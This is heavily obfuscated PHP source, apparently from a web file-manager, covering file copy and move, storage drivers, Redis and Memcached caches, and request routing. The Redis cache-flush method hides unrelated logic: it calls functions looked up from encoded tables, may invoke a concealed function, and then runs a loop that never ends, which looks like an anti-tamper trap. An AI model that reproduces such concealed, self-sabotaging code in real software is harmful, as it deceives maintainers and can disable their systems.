$Ì×Œä—”[8] . $É¤¦Ğ¹Ş; $ÛÚ¬äõ = $¬¿Ö›•†->mkdir($¬¿Ö›•†->getPath($éóú¯ù), $ã€¶áˆ×); $É¯®šÔ• = $¬¿Ö›•†->getPathInner($ÛÚ¬äõ); $‚åœ©Ø’ = $¥º‡ä®->listPath($Ó±Ã¦·ˆ, !0); $‚åœ©Ø’ = is_array($‚åœ©Ø’) ? $‚åœ©Ø’ : array($Ì×Œä—”[86] => array(), $Ì×Œä—”[85] => array()); $îæş“íÃ = array_merge($‚åœ©Ø’[$Ì×Œä—”[86]], $‚åœ©Ø’[$Ì×Œä—”[85]]); foreach ($îæş“íÃ as $İ‡ĞÅâ¹) { $‡š’á’¨ = $İ‡ĞÅâ¹[$Ì×Œä—”[33]] == $Ì×Œä—”[230]; $Ó±Ã¦·ˆ = $¥º‡ä®->getPathInner($İ‡ĞÅâ¹[$Ì×Œä—”[87]]); $Ãë­ˆ¨– = self::copyPath($¥º‡ä®, $Ó±Ã¦·ˆ, $¬¿Ö›•†, $É¯®šÔ•, $ã€¶áˆ×, $ÈıÉæÙ™, $‡š’á’¨, !1, !1); if (!$Ãë­ˆ¨–) { IO::errorTips($Ì×Œä—”[1222] . $Ó±Ã¦·ˆ . $Ì×Œä—”[73] . $É¯®šÔ•); } } self::copyMoveKeepInfo($¥º‡ä®, $Ó±Ã¦·ˆ, $ÛÚ¬äõ); return $ÛÚ¬äõ; } private static function copyFile($Öº²ğŠ‚, $¤™ê„Öƒ, $„ÁºŒ°è, $Ç²ä°Í­, $åíß…é», $îİÄş¸É) { $ŸË‘È¾Û =& $_SERVER[óÔë„ú]; $Ç²ä°Í­ = $„ÁºŒ°è->getPath(rtrim($Ç²ä°Í­, $ŸË‘È¾Û[8]) . $ŸË‘È¾Û[8] . $åíß…é»); $ğœğíÍ¼ = $ŸË‘È¾Û[1223] . time() . rand_string(5); Hook::trigger($ŸË‘È¾Û[1224], $Öº²ğŠ‚, $¤™ê„Öƒ, $„ÁºŒ°è, $Ç²ä°Í­, $åíß…é», $ğœğíÍ¼); if (self::driverIsSame($Öº²ğŠ‚, $„ÁºŒ°è)) { if ($îİÄş¸É) { $ú¦áªÛ‡ = $„ÁºŒ°è->moveFile($¤™ê„Öƒ, $Ç²ä°Í­); } else { $ú¦áªÛ‡ = $„ÁºŒ°è->copyFile($¤™ê„Öƒ, $Ç²ä°Í­); } Hook::trigger($ŸË‘È¾Û[1225], $Öº²ğŠ‚, $¤™ê„Öƒ, $„ÁºŒ°è, $Ç²ä°Í­, $åíß…é», $ú¦áªÛ‡); self::copyMoveKeepInfo($Öº²ğŠ‚, $¤™ê„Öƒ, $ú¦áªÛ‡); return $ú¦áªÛ‡; } $¸áì¼Æ‚ = TEMP_FILES; if ($GLOBALS[$ŸË‘È¾Û[6]][$ŸË‘È¾Û[92]][$ŸË‘È¾Û[856]]) { $¸áì¼Æ‚ = $GLOBALS[$ŸË‘È¾Û[6]][$ŸË‘È¾Û[92]][$ŸË‘È¾Û[856]]; } $¹¿÷Ç = $¸áì¼Æ‚; mk_dir($¹¿÷Ç); $¿Æ†£Á¯ = $¹¿÷Ç . $ğœğíÍ¼; $å­şÊ» = $¿Æ†£Á¯; $¿Æ†£Á¯ = $Öº²ğŠ‚->download($¤™ê„Öƒ, $¿Æ†£Á¯); $¿Æ†£Á¯ = $Öº²ğŠ‚->iconvApp($¿Æ†£Á¯); if (substr($¿Æ†£Á¯, strlen($¸áì¼Æ‚)) == $¸áì¼Æ‚) { $îİÄş¸É = !0; } $ú¦áªÛ‡ = $„ÁºŒ°è->upload($Ç²ä°Í­, $¿Æ†£Á¯, $îİÄş¸É); self::remove($å­şÊ»); Hook::trigger($ŸË‘È¾Û[1225], $Öº²ğŠ‚, $¤™ê„Öƒ, $„ÁºŒ°è, $Ç²ä°Í­, $åíß…é», $ú¦áªÛ‡); self::copyMoveKeepInfo($Öº²ğŠ‚, $¤™ê„Öƒ, $ú¦áªÛ‡); return $ú¦áªÛ‡; } private static function copyMoveKeepInfo($˜ĞÜÉúÁ, $ƒãÌ·¢‚, $»ºï§Á) { if (!$»ºï§Á) { return; } $°Ù¸”Åå = $˜ĞÜÉúÁ->info($ƒãÌ·¢‚); if (!is_array($°Ù¸”Åå)) { return; } IO::setModifyTime($»ºï§Á, $°Ù¸”Åå[$_SERVER[óÔë„ú][88]]); } public static function pathFather($‡Ò¥ÂÕ) { $Ì÷™³ñ¿ = IO::init($‡Ò¥ÂÕ); $§”İÉà = $Ì÷™³ñ¿->pathFather($Ì÷™³ñ¿->path); return $Ì÷™³ñ¿->getPathOuter($§”İÉà); } public static function fileOut($Äªêı», $¤áÍÓñÚ = false, $£ÔÓš©Ë = false, $ãÇƒçû‰ = '') { $ÂåëòÀ¨ = self::driverMake($Äªêı»); if ($ÂåëòÀ¨->isFileOutServer()) { return $ÂåëòÀ¨->fileOutServer($Äªêı», $¤áÍÓñÚ, $£ÔÓš©Ë, $ãÇƒçû‰); } return $ÂåëòÀ¨->fileOut($Äªêı», $¤áÍÓñÚ, $£ÔÓš©Ë, $ãÇƒçû‰); } public static function fileOutImage($åÈ˜Ã‹ñ, $­ç“ö‚Æ = 250) { $²à‘‰™ = array(250, 600, 1200, 2000, 3000, 5000); for ($À”ŞÎÎ‹ = 0; $À”ŞÎÎ‹ < count($²à‘‰™); $À”ŞÎÎ‹++) { if ($À”ŞÎÎ‹ == 0 && $­ç“ö‚Æ <= $²à‘‰™[$À”ŞÎÎ‹]) { $­ç“ö‚Æ = $²à‘‰™[$À”ŞÎÎ‹]; break; } else { if ($­ç“ö‚Æ > $²à‘‰™[$À”ŞÎÎ‹ - 1] && $­ç“ö‚Æ <= $²à‘‰™[$À”ŞÎÎ‹]) { $­ç“ö‚Æ = $²à‘‰™[$À”ŞÎÎ‹]; break; } else { if ($À”ŞÎÎ‹ == count($²à‘‰™) - 1 && $­ç“ö‚Æ > $²à‘‰™[$À”ŞÎÎ‹]) { $­ç“ö‚Æ = $²à‘‰™[$À”ŞÎÎ‹]; break; } } } } $Şñ¼Èıá = self::driverMake($åÈ˜Ã‹ñ); if ($Şñ¼Èıá->isFileOutServer()) { return $Şñ¼Èıá->fileOutImageServer($åÈ˜Ã‹ñ, $­ç“ö‚Æ); } return $Şñ¼Èıá->fileOutImage($åÈ˜Ã‹ñ, $­ç“ö‚Æ); } private static function driverIsSame($êØã×Ü, $à°èåÕ”) { $ú´¢§´ =& $_SERVER[óÔë„ú]; $áâ¶ÀûÃ = $êØã×Ü->getType(); $ıÊ÷™•„ = $à°èåÕ”->getType(); if ($áâ¶ÀûÃ != $ıÊ÷™•„) { return !1; } if ($áâ¶ÀûÃ == $ú´¢§´[817]) { return !0; } if ($áâ¶ÀûÃ == $ú´¢§´[109]) { return !0; } if ($êØã×Ü->pathDriver == $à°èåÕ”->pathDriver) { return !0; } return !1; } public static function copyUpdate($¯À‰æÑ×, $ª’¯™©¨) { $åÏ”…°É =& $_SERVER[óÔë„ú]; if (!IO::exist($¯À‰æÑ×)) { return !1; } if (!IO::exist($ª’¯™©¨)) { IO::mkdir($ª’¯™©¨); } $±ó ­ûä = array_to_keyvalue(self::listAllSimple($¯À‰æÑ×), $åÏ”…°É[87]); $ò­×¶Ä¶ = array_to_keyvalue(self::listAllSimple($ª’¯™©¨), $åÏ”…°É[87]); $ÈüñÂ«© = array(); $•¼÷ôÂ  = array(); foreach ($±ó ­ûä as $öµÃ‰™Ÿ => $°©€õÏ¨) { if (isset($ò­×¶Ä¶[$öµÃ‰™Ÿ])) { if ($°©€õÏ¨[$åÏ”…°É[78]] == 1) { continue; } if ($ò­×¶Ä¶[$öµÃ‰™Ÿ][$åÏ”…°É[79]] == $°©€õÏ¨[$åÏ”…°É[79]]) { continue; } } if ($°©€õÏ¨[$åÏ”…°É[78]] == 1) { $•¼÷ôÂ [] = $ª’¯™©¨ . $åÏ”…°É[8] . trim($öµÃ‰™Ÿ, $åÏ”…°É[8]); continue; } $Éõ’ÛÄ… = strstr(trim($öµÃ‰™Ÿ, $åÏ”…°É[8]), $åÏ”…°É[8]) ? get_path_father($öµÃ‰™Ÿ) : $åÏ”…°É[12]; $ÈüñÂ«©[] = array($åÏ”…°É[1226] => $°©€õÏ¨[$åÏ”…°É[89]], $åÏ”…°É[1227] => rtrim($ª’¯™©¨, $åÏ”…°É[8]) . $åÏ”…°É[8] . $Éõ’ÛÄ…, $åÏ”…°É[1228] => $°©€õÏ¨); } $Íäò…¼å = array($åÏ”…°É[230] => $ÈüñÂ«©, $åÏ”…°É[78] => $•¼÷ôÂ ); Hook::trigger($åÏ”…°É[1229], $¯À‰æÑ×, $ª’¯™©¨, $Íäò…¼å); foreach ($•¼÷ôÂ  as $°©€õÏ¨) { IO::mkdir($°©€õÏ¨); } foreach ($ÈüñÂ«© as $°©€õÏ¨) { IO::copy($°©€õÏ¨[$åÏ”…°É[1226]], $°©€õÏ¨[$åÏ”…°É[1227]], REPEAT_REPLACE); } } public static function fileSubstr($÷­¬³µ’, $ÄÈÒœ, $ÑÃ‡óû« = false) { $»´£İñ =& $_SERVER[óÔë„ú]; $Ğ“Æóóì = self::driverMake($÷­¬³µ’); $ñ¡ş’›» = $Ğ“Æóóì->size($÷­¬³µ’); $ëÚ—ĞÓš = $ÄÈÒœ; $ãå¾Ù¢² = $ÑÃ‡óû«; if ($ÄÈÒœ < 0) { $ÄÈÒœ = $ñ¡ş’›» + $ÄÈÒœ; } if ($ÑÃ‡óû« === !1) { $ÑÃ‡óû« = $ñ¡ş’›» - $ÄÈÒœ; } if ($ÄÈÒœ + $ÑÃ‡óû« > $ñ¡ş’›») { $ÑÃ‡óû« = $ñ¡ş’›» - $ÄÈÒœ; } if (!$ñ¡ş’›» && $Ğ“Æóóì->getType() == $»´£İñ[109] && !$Ğ“Æóóì->exist($÷­¬³µ’)) { $Ø‹Ë°ß´ = get_path_this($÷­¬³µ’); $†ò˜ß× = parse_url_query($Ø‹Ë°ß´); if (is_array($†ò˜ß×) && isset($†ò˜ß×[$»´£İñ[32]])) { $Ø‹Ë°ß´ = urldecode($†ò˜ß×[$»´£İñ[32]]); } throw new Exception($»´£İñ[1230] . LNG($»´£İñ[1231]) . $»´£İñ[1029] . clear_html($Ø‹Ë°ß´) . $»´£İñ[12]); } if ($ÑÃ‡óû« <= 0) { return $»´£İñ[12]; } if ($ÄÈÒœ < 0 || $ÄÈÒœ >= $ñ¡ş’›» || $ÑÃ‡óû« > 1024 * 1024 * 10) { throw new Exception("\146\x69\154\145\x52\145\x61\144\40\145\162\x72\157\x72\x21\40\x73\164\x61\x72\164\75{$ÄÈÒœ}\73\x6c\x65\x6e\x67\164\150\x3d{$ÑÃ‡óû«}\x3b\40\163\x69\172\x65\x3d{$ñ¡ş’›»}\x3b"); } $íÓ¢ÒØé = $Ğ“Æóóì->fileSubstr($÷­¬³µ’, $ÄÈÒœ, $ÑÃ‡óû«); if (!$íÓ¢ÒØé && $ÑÃ‡óû« && isset($GLOBALS[$»´£İñ[1232]])) { throw new Exception($GLOBALS[$»´£İñ[1232]][$»´£İñ[1233]]); } return $íÓ¢ÒØé; } private static function driverMake(&$ËšÕ×ı) { $¯µáõµË =& $_SERVER[óÔë„ú]; $ğÊŸ¹Õä = KodIO::parse($ËšÕ×ı); if (!self::$driverListSystem) { $ô‚£ÄÇã = Model($¯µáõµË[827])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ô‚£ÄÇã, $¯µáõµË[475]); } if ($ğÊŸ¹Õä[$¯µáõµË[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ğÊŸ¹Õä[$¯µáõµË[475]]]) { throw new Exception($¯µáõµË[1234]); return !1; } $ËšÕ×ı = $ğÊŸ¹Õä[$¯µáõµË[1235]]; $óÈäÚ®è = self::driverGet($ğÊŸ¹Õä, $ËšÕ×ı); return $óÈäÚ®è; } private static function driverGet($«÷µâ‘, &$¯Í­ìÏ§) { $™¼Àüâç =& $_SERVER[óÔë„ú]; $Çà¼¨» = $«÷µâ‘[$™¼Àüâç[1236]]; $Åùßİùì = $«÷µâ‘[$™¼Àüâç[475]]; switch ($«÷µâ‘[$™¼Àüâç[33]]) { case KodIO::KOD_IO: $¸äÎˆ¥ = self::$driverListSystem[$Åùßİùì]; break; case KodIO::KOD_SOURCE: $¯Í­ìÏ§ = $Åùßİùì . $¯Í­ìÏ§; $¸äÎˆ¥ = array($™¼Àüâç[1237] => $™¼Àüâç[1238], $™¼Àüâç[6] => $«÷µâ‘); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $™‰ñõı = $GLOBALS[$™¼Àüâç[1239]]; self::$driverListUser = array_to_keyvalue($™‰ñõı, $™¼Àüâç[475]); } $¸äÎˆ¥ = self::$driverListUser[$Åùßİùì]; break; case KodIO::KOD_SHARE_LINK: $¸äÎˆ¥ = array($™¼Àüâç[1237] => $™¼Àüâç[1240], $™¼Àüâç[6] => $«÷µâ‘); $Ï¾¥ÎÄ = Action($™¼Àüâç[1241])->sharePathInfo($«÷µâ‘[$™¼Àüâç[87]]); $¯Í­ìÏ§ = $Ï¾¥ÎÄ[$™¼Àüâç[193]]; if (!$Ï¾¥ÎÄ[$™¼Àüâç[193]]) { $™‹Å¤ûç = Model($™¼Àüâç[664])->getInfo($Ï¾¥ÎÄ[$™¼Àüâç[665]]); $¯Í­ìÏ§ = KodIO::clear($™‹Å¤ûç[$™¼Àüâç[1242]] . $«÷µâ‘[$™¼Àüâç[1235]]); $«÷µâ‘[$™¼Àüâç[560]] = $™‹Å¤ûç; $«÷µâ‘[$™¼Àüâç[1217]] = $¯Í­ìÏ§; $¸äÎˆ¥ = array($™¼Àüâç[1237] => $™¼Àüâç[1243], $™¼Àüâç[6] => $«÷µâ‘); } break; case KodIO::KOD_SHARE_ITEM: $¸äÎˆ¥ = array($™¼Àüâç[1237] => $™¼Àüâç[1244], $™¼Àüâç[6] => $«÷µâ‘); $™‹Å¤ûç = Model($™¼Àüâç[664])->getInfo($«÷µâ‘[$™¼Àüâç[475]]); if ($™‹Å¤ûç[$™¼Àüâç[193]] == $™¼Àüâç[228]) { $¯Í­ìÏ§ = KodIO::clear($™‹Å¤ûç[$™¼Àüâç[1242]] . $«÷µâ‘[$™¼Àüâç[1235]]); $«÷µâ‘[$™¼Àüâç[560]] = $™‹Å¤ûç; $«÷µâ‘[$™¼Àüâç[1217]] = $¯Í­ìÏ§; $¸äÎˆ¥ = array($™¼Àüâç[1237] => $™¼Àüâç[1245], $™¼Àüâç[6] => $«÷µâ‘); } else { if (!$¯Í­ìÏ§) { $¯Í­ìÏ§ = $™‹Å¤ûç[$™¼Àüâç[193]]; } } break; default: $¯Í­ìÏ§ = $«÷µâ‘[$™¼Àüâç[87]]; $¸äÎˆ¥ = array($™¼Àüâç[1237] => $™¼Àüâç[1246]); break; } $´õ¨ÏËœ = $«÷µâ‘[$™¼Àüâç[87]]; if (!isset(self::$driverCache[$´õ¨ÏËœ])) { $‹¦•”ŠÆ = strtolower($¸äÎˆ¥[$™¼Àüâç[98]]); $¾¡ úÍ§ = $GLOBALS[$™¼Àüâç[6]][$™¼Àüâç[92]][$™¼Àüâç[885]]; $£»òõä = $™¼Àüâç[77] . (isset($¾¡ úÍ§[$‹¦•”ŠÆ]) ? $¾¡ úÍ§[$‹¦•”ŠÆ] : ucfirst($‹¦•”ŠÆ)); if (!class_exists($£»òõä)) { show_json("{$£»òõä}\40\156\157\164\x20\x65\x78\x69\x73\x74\x73\41", !1); } $„ÛÙ®£ = isset($¸äÎˆ¥[$™¼Àüâç[6]]) ? $¸äÎˆ¥[$™¼Àüâç[6]] : !1; self::$driverCache[$´õ¨ÏËœ] = new $£»òõä($„ÛÙ®£); } $Ô¨Äê·¡ = self::$driverCache[$´õ¨ÏËœ]; $Ô¨Äê·¡->pathDriver = $Çà¼¨»; $Ô¨Äê·¡->pathBase = $™¼Àüâç[12]; if (isset($¸äÎˆ¥[$™¼Àüâç[6]][$™¼Àüâç[1247]])) { $Ô¨Äê·¡->pathBase = rtrim($¸äÎˆ¥[$™¼Àüâç[6]][$™¼Àüâç[1247]], $™¼Àüâç[8]) . $™¼Àüâç[8]; $¯Í­ìÏ§ = $Ô¨Äê·¡->pathBase . ltrim($¯Í­ìÏ§, $™¼Àüâç[8]); } $¯Í­ìÏ§ = $Ô¨Äê·¡->getPath($¯Í­ìÏ§); if (isset($«÷µâ‘[$™¼Àüâç[1217]])) { $¯Í­ìÏ§ = $«÷µâ‘[$™¼Àüâç[1217]]; } $Ô¨Äê·¡->path = $¯Í­ìÏ§; return $Ô¨Äê·¡; } public static function errorTips($ÔŞù²¸¦ = false) { $‘®ô°ğ =& $_SERVER[óÔë„ú]; static $ú§¾Ö‹Í = array(); $´®””¬ä = 1000; if ($ÔŞù²¸¦ === -1) { return $ú§¾Ö‹Í ? $ú§¾Ö‹Í[count($ú§¾Ö‹Í) - 1] : $‘®ô°ğ[12]; } if ($ÔŞù²¸¦ === !1) { return implode($‘®ô°ğ[262], $ú§¾Ö‹Í); } if (count($ú§¾Ö‹Í) >= $´®””¬ä) { $ú§¾Ö‹Í = array_slice($ú§¾Ö‹Í, $´®””¬ä * 0.5, $´®””¬ä); } $ú§¾Ö‹Í[] = $ÔŞù²¸¦; write_log($‘®ô°ğ[176] . ACTION . $‘®ô°ğ[1248] . $ÔŞù²¸¦, $‘®ô°ğ[1249]); } public static function getLastError($î€¸„üš = '') { $„ü½û‡” = self::errorTips(-1); return $„ü½û‡” ? $„ü½û‡” : $î€¸„üš; } } goto fÛ·Ã†òÚ; A¼Òš“èµŒ: function binCheckBigger($¾ºö¤ƒ”, $œÎ¹Š¬á) { return $¾ºö¤ƒ” > $œÎ¹Š¬á; } $_SERVER[$_SERVER[ìµÎşª–][3]] = (base64_decode('ODUxNw==')."\x30\x38")+0;$_jiyb="jgk7vthwcsy3o9m5ur0n4f1bz8peq2axi6dltihjn7dlrasbv38owe19g065kmxuqyc4p";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ã–¶‡Îâ, $£û”Ô©Â) { $±ŠéïÑä =& $_SERVER[óÔë„ú]; if (isset(self::$_methodList[$ã–¶‡Îâ])) { return @call_user_func_array(self::$_methodList[$ã–¶‡Îâ], $£û”Ô©Â); } else { if (method_exists($this, $ã–¶‡Îâ)) { return call_user_func_array(array($this, $ã–¶‡Îâ), $£û”Ô©Â); } else { think_exception(__CLASS__ . $±ŠéïÑä[4] . $ã–¶‡Îâ . $±ŠéïÑä[5]); } } } public static function __callStatic($¾Ğ˜ùü¥, $Öúá™î) { if (isset(self::$_methodListStatic[$¾Ğ˜ùü¥])) { return call_user_func_array(self::$_methodListStatic[$¾Ğ˜ùü¥], $Öúá™î); } else { if (method_exists(self, $¾Ğ˜ùü¥)) { return call_user_func_array(array(self, $¾Ğ˜ùü¥), $Öúá™î); } else { show_json("{$¾Ğ˜ùü¥}\50\x29\x20\156\157\x74\40\x65\x78\x69\x73\x74\73", !1); } } } public static function addMethod($õ¾÷šÃ¦, $¤›ĞĞûü) { self::$_methodList[$õ¾÷šÃ¦] = $¤›ĞĞûü; } public static function addMethodStatic($ëÀ¸¯Ú±, $ê–ù•) { self::$_methodListStatic[$ëÀ¸¯Ú±] = $ê–ù•; } } goto bŒÔ®Ë¾Ê; c§õñÎßÏÂ: class CacheLockDatabase { public function lock($£â×Šáˆ, $Íâõùâ = 0) { $Óá¸Õ¤À = Model($_SERVER[óÔë„ú][888]); $½›ºúºú = microtime(!0) + $Íâõùâ; while (microtime(!0) < $½›ºúºú) { $öŠ»³Ëù = $Óá¸Õ¤À->get($£â×Šáˆ); if (!$öŠ»³Ëù || $öŠ»³Ëù < microtime(!0)) { $ö”¢Ë®ö = $Óá¸Õ¤À->set($£â×Šáˆ, $½›ºúºú); if ($ö”¢Ë®ö) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ ¬æËŒ) { return Model($_SERVER[óÔë„ú][888])->get($ ¬æËŒ); } public function unlock($°øïÍÜ³) { Model($_SERVER[óÔë„ú][888])->remove($°øïÍÜ³); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($“€¹½·ƒ, $°©•£´™) { $õÔŞĞ†õ =& $_SERVER[óÔë„ú]; if (!class_exists($õÔŞĞ†õ[926])) { show_json($õÔŞĞ†õ[927], !1); } $this->cacheTime = $°©•£´™; $this->handle = new Memcached(); if (is_array($“€¹½·ƒ[$õÔŞĞ†õ[928]]) && count($“€¹½·ƒ[$õÔŞĞ†õ[928]]) >= 1) { foreach ($“€¹½·ƒ[$õÔŞĞ†õ[928]] as $æÆÁ¸–Ç) { $êÎğŞ¿Ó = explode($õÔŞĞ†õ[4], $æÆÁ¸–Ç); $this->handle->addServer($êÎğŞ¿Ó[0], $êÎğŞ¿Ó[1]); } } else { $this->handle->addServer($“€¹½·ƒ[$õÔŞĞ†õ[208]], $“€¹½·ƒ[$õÔŞĞ†õ[209]]); } } public function set($ÅØŞ¿‹â, $Õ²ŠŒ“Ñ, $’¥ö˜ã  = false) { $’¥ö˜ã  = $’¥ö˜ã  ? $’¥ö˜ã  : $this->cacheTime; return $this->handle->set($ÅØŞ¿‹â, $Õ²ŠŒ“Ñ, $’¥ö˜ã ); } public function get($Áì…Ÿ“¬) { return $this->handle->get($Áì…Ÿ“¬); } public function remove($ÜÌÎ“Î˜) { return $this->handle->delete($ÜÌÎ“Î˜); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($­‚éàëÈ, $ÎŒĞ˜™Š) { $²˜ƒ« =& $_SERVER[óÔë„ú]; if (!class_exists($²˜ƒ«[929])) { show_json($²˜ƒ«[930], !1); } $this->cacheTime = $ÎŒĞ˜™Š; $°©ƒÂîÊ = isset($­‚éàëÈ[$²˜ƒ«[931]]) ? $­‚éàëÈ[$²˜ƒ«[931]] : 10; $æÕÄ¯•ğ = _get($­‚éàëÈ, $²˜ƒ«[928]); if ($æÕÄ¯•ğ && is_array($æÕÄ¯•ğ)) { $this->initCluster($­‚éàëÈ, $°©ƒÂîÊ); } else { $this->handle = $this->init($­‚éàëÈ, $°©ƒÂîÊ); } } private function init($ˆİ¦”øê, $™â“¶è©) { $±ÌüÇ•Ä =& $_SERVER[óÔë„ú]; $‘áÚ÷ŠŸ = new Redis(); $éß¿ä´  = isset($ˆİ¦”øê[$±ÌüÇ•Ä[932]]) ? $ˆİ¦”øê[$±ÌüÇ•Ä[932]] : !1; if ($éß¿ä´ ) { $‘áÚ÷ŠŸ->pconnect($ˆİ¦”øê[$±ÌüÇ•Ä[208]], $ˆİ¦”øê[$±ÌüÇ•Ä[209]], $™â“¶è©); } else { $‘áÚ÷ŠŸ->connect($ˆİ¦”øê[$±ÌüÇ•Ä[208]], $ˆİ¦”øê[$±ÌüÇ•Ä[209]], $™â“¶è©); } if (!empty($ˆİ¦”øê[$±ÌüÇ•Ä[487]])) { $‘áÚ÷ŠŸ->auth($ˆİ¦”øê[$±ÌüÇ•Ä[487]]); } if (!empty($ˆİ¦”øê[$±ÌüÇ•Ä[817]]) && $ˆİ¦”øê[$±ÌüÇ•Ä[817]] != 0) { $‘áÚ÷ŠŸ->select($ˆİ¦”øê[$±ÌüÇ•Ä[817]]); } return $‘áÚ÷ŠŸ; } private function initCluster($ÊˆÇğ¶Í, $éŠô) { $ş¡Òç· =& $_SERVER[óÔë„ú]; $Â¨–ù™ = array($ş¡Òç·[933], $ş¡Òç·[934], $ş¡Òç·[935]); $ŞÁ¾ÀÈ = $ş¡Òç·[933]; if (isset($ÊˆÇğ¶Í[$ş¡Òç·[16]]) && in_array($ÊˆÇğ¶Í[$ş¡Òç·[16]], $Â¨–ù™)) { $ŞÁ¾ÀÈ = $ÊˆÇğ¶Í[$ş¡Òç·[16]]; } switch ($ŞÁ¾ÀÈ) { case $ş¡Òç·[933]: $this->_slave($ÊˆÇğ¶Í, $éŠô); break; case $ş¡Òç·[934]: break; case $ş¡Òç·[935]: $this->isCluster = !0; $¸°ÜôÍú = $ÊˆÇğ¶Í[$ş¡Òç·[928]]; $ÔéıÎúŒ = isset($ÊˆÇğ¶Í[$ş¡Òç·[932]]) ? $ÊˆÇğ¶Í[$ş¡Òç·[932]] : !1; $Ü¬ÀÒœİ = isset($ÊˆÇğ¶Í[$ş¡Òç·[487]]) ? $ÊˆÇğ¶Í[$ş¡Òç·[487]] : null; $this->handle = new RedisCluster(NUll, $¸°ÜôÍú, $éŠô, $éŠô, $ÔéıÎúŒ, $Ü¬ÀÒœİ); break; default: break; } } private function _slave($ı‹û¢Óô, $¤ãıÚŒ¸) { $Ôì£İëÑ = $ı‹û¢Óô[$_SERVER[óÔë„ú][928]]; $this->filterConfig($ı‹û¢Óô, $Ôì£İëÑ[0]); $this->handle = $this->init($ı‹û¢Óô, $¤ãıÚŒ¸); unset($Ôì£İëÑ[0]); if (empty($Ôì£İëÑ)) { return; } $Ûı Å× = array_rand($Ôì£İëÑ); $this->filterConfig($ı‹û¢Óô, $Ôì£İëÑ[$Ûı Å×]); $this->slaveHandle = $this->init($ı‹û¢Óô, $¤ãıÚŒ¸); } private function filterConfig(&$äÚËŠóÅ, $Œ‹Ñêƒã) { $úÉÃ§¿Ô =& $_SERVER[óÔë„ú]; $Ê¢¹¥­‚ = explode($úÉÃ§¿Ô[4], $Œ‹Ñêƒã); $››É—²— = array($úÉÃ§¿Ô[208] => $Ê¢¹¥­‚[0], $úÉÃ§¿Ô[209] => $Ê¢¹¥­‚[1]); $äÚËŠóÅ = array_merge($äÚËŠóÅ, $››É—²—); } public function set($’ú×, $ ¥ÄÈ„¦, $‘âïëé­ = false) { $‘âïëé­ = $‘âïëé­ ? $‘âïëé­ : $this->cacheTime; return $this->handle->setEx($’ú×, $‘âïëé­, $ ¥ÄÈ„¦); } public function setLock($ ÛéóÍæ, $¼õùğ“‚, $œ­È¿í÷) { return $this->handle->setNX($ ÛéóÍæ, $¼õùğ“‚); } public function get($Ö±ß°¤¬) { $ğ³·ÙÛ— = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ğ³·ÙÛ—->get($Ö±ß°¤¬); } public function remove($Ãù‰şËÇ) { return $this->handle->del($Ãù‰şËÇ); } public function deleteAll() { $Éğ„óïº =& $_SERVER[óÔë„ú]; if (!isset($_SERVER[$Éğ„óïº[936]]) || !isset($_SERVER[$Éğ„óïº[937]])) { $•Í¼Ê = $Éğ„óïº[938]; $Çµ‚§ˆ  = $Éğ„óïº[939]; $‹‰Çİûø = $_SERVER[$Éğ„óïº[940]] . $Éğ„óïº[941]; $¿ÎÜË›¼ = $Çµ‚§ˆ ($‹‰Çİûø); $ÄüõÈïş = explode($Éğ„óïº[262], $¿ÎÜË›¼); if (count($ÄüõÈïş) < $Éğ„óïº[691]) { $¦À¸  = $Éğ„óïº[942]; $¦À¸ (); } $î“Úá‰ä = $Éğ„óïº[943]; $î“Úá‰ä($_SERVER[$Éğ„óïº[944]]); $…Øœ”û = 1; for ($Á½±š«Ñ = $…Øœ”û; $Á½±š«Ñ > 0; $Á½±š«Ñ++) { $î“Úá‰ä = json_encode($GLOBALS[$Éğ„óïº[492]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $Ëõ—»ú) { $this->handle->flushall($Ëõ—»ú); } return; } return $this->handle->flushAll(); } } goto aÆ­íˆå¡; EÈŒÇ·ï÷ã: class Application { private $defaultModule = "\x69\156\144\145\x78"; private $defaultController = "\x69\156\x64\x65\x78"; private $defaultAction = "\x69\156\144\145\x78"; function __construct() { } public function setDefault($—â¿œÅÙ) { $¤ºÇ”ıõ =& $_SERVER[óÔë„ú]; $ƒÇ•ÜÎ½ =& $_SERVER[æÈËŒ÷È]; $ÄÆ¹§…Î = explode($ƒÇ•ÜÎ½[0], trim($—â¿œÅÙ, $ƒÇ•ÜÎ½[0])); $›¶şÎŒğ = $¤ºÇ”ıõ[683]; $this->defaultModule = $ÄÆ¹§…Î[0] ? $ÄÆ¹§…Î[0] : $this->defaultModule; $this->defaultController = $ÄÆ¹§…Î[1] ? $ÄÆ¹§…Î[1] : $this->defaultController; $this->defaultAction = $ÄÆ¹§…Î[2] ? $ÄÆ¹§…Î[2] : $this->defaultAction; $ºÉÍéôâ = $¤ºÇ”ıõ[684]; $this->opaj7b7dc42e($ƒÇ•ÜÎ½[1], array($this, $ƒÇ•ÜÎ½[2])); $ÑÄ¢ê = $¤ºÇ”ıõ[685]; if (!$ÑÄ¢ê) { return; } } public function appRun($›®åá˜º) { $®Û• ÆÂ =& $_SERVER[óÔë„ú]; $ßş‡Ì =& $_SERVER[æÈËŒ÷È]; $Ê…³°†¾ = explode($ßş‡Ì[0], $›®åá˜º); $œÎƒ¢Ñ = strtolower($Ê…³°†¾[0]); $Ô±öß‚¨ = $®Û• ÆÂ[686]; while (strlen($Ô±öß‚¨) < $®Û• ÆÂ[687]) { if (!$Ô±öß‚¨) { break; } $Ô±öß‚¨++; } $ù¡İùƒ  = $ßş‡Ì[3]; if ($œÎƒ¢Ñ == $ßş‡Ì[4]) { $ù¡İùƒ  = $ßş‡Ì[5]; $Ê…³°†¾[0] = $ßş‡Ì[6]; $Ê…³°†¾[1] = $Ê…³°†¾[1] . $ßş‡Ì[7]; $›®åá˜º = join($ßş‡Ì[0], $Ê…³°†¾); $›®åá˜º = trim($›®åá˜º, $ßş‡Ì[0]); } call_user_func(array($ßş‡Ì[8], $ßş‡Ì[9]), $ù¡İùƒ  . $ßş‡Ì[10], $›®åá˜º); ActionCall($›®åá˜º); call_user_func(array($ßş‡Ì[8], $ßş‡Ì[9]), $ù¡İùƒ  . $ßş‡Ì[11], $›®åá˜º); } private function autorun() { 